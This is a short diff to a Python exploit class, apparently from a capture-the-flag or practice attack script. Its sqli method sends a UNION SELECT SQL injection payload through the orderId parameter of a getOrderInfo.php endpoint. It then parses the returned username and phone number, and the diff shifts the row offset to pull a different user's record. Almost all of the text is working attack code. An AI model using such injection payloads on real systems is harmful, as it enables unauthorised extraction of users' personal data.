@@ -47,11 +47,12 @@ class exp:
 
     def sqli(self):
         '尝试sql注入获取其他用户手机号'
-        sql='1000000 union select 1,database(),(select concat_ws(char(32,58,32),username,phonenumber) from User limit 1,1),4,5;--'
+        sql='1000000 union select 1,database(),(select concat_ws(char(32,58,32),username,phonenumber) from User limit 0,1),4,5;--'
         rs = self.session.get(self.url + '/src/order/getOrderInfo.php', params={'orderId': sql},timeout=10)
         #print(rs.text)
         status = json.loads(rs.text).get('status')
         data = json.loads(rs.text).get('data').get('prodid')
+        #print(data)
         if (status):
             self.phonenumber = data.split(':')[1].strip()
             #print(self.phonenumber)
